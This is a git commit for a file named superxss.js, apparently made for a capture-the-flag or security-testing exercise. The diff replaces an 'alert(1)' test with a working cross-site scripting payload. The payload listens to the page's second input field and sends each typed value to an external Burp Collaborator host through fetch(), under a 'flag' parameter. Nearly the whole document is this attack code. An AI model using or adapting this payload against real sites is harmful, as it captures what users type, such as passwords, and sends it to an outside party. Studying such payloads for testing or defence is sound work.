dc32e60e3ed44191bb14c38271599fc7a66376c5
Tomato <68746860+BitByteButter@users.noreply.github.com>
2023-04-24 15:38:32 +0545

    superxss.js

--- superxss.js
+++ superxss.js
@@ -1,1 +1,1 @@
-alert(1);
+document.querySelectorAll('input')[1].addEventListener('input',function(){event.preventDefault();fetch("https://tgdltoc9ydgz5p5kz786v7nce3k78w.burpcollaborator.net?flag="+document.querySelectorAll('input')[1].value)})
